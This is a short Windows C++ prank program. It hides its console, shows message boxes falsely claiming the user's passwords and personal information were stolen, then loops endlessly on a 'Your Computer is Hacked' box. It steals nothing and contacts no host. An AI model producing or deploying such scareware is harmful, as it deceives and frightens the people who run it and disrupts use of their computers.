#include <windows.h>

int WINAPI WinMain(
    HINSTANCE,
    HINSTANCE,
    LPSTR,
    int
) {
    // Hide console window completely
    HWND console = GetConsoleWindow();
    if (console) {
        ShowWindow(console, SW_HIDE);
    }
    FreeConsole();

    // First message (once)
    MessageBoxA(
        nullptr,
        "Hands up skid",
        "Error",
        1 + 16
    );

    // Second message (once)
    MessageBoxA(
        nullptr,
        "Your passwords and personal information have been stolen",
        "Error",
        1 + 16
    );

    // Spam message
    while (true) {
        MessageBoxA(
            nullptr,
            "Your Computer is Hacked",
            "Error",
            1 + 16
        );
    }

    return 0;
}
